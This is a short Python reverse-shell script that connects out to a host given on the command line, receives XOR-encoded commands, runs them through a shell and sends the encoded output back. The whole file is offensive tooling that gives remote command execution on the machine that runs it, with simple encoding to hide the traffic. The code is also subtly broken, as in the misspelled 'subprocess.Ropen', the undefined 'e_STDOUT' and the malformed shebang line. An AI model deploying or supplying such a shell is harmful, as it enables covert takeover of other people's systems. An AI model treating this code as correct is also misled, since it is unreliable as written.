#! /usr/bin python

import socket, subprocess, sys

RHOST = sys.argv[1]
RPORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

while True:
	#recieve XOR encoded data from network socket
	data = s.recv(1024)

	#XOR the data again with a '\x41' to get back to normal data
	en_data = bytearray(data)	
	for i in range(len(en_data)):
		en_data[i] ^= 0x41

	#Execute the decoded data as a command. The subprocess module is great becausewe can PIPE STDOUT/STDIN
	comm = subprocess.Ropen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	STDOUT, STDERR = comm.communicate()

	#Encode the output and send to RHOST
	en_STDOUT = bytearray(STDOUT)
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^= 0x41
	s.send(e_STDOUT)
s.close() 

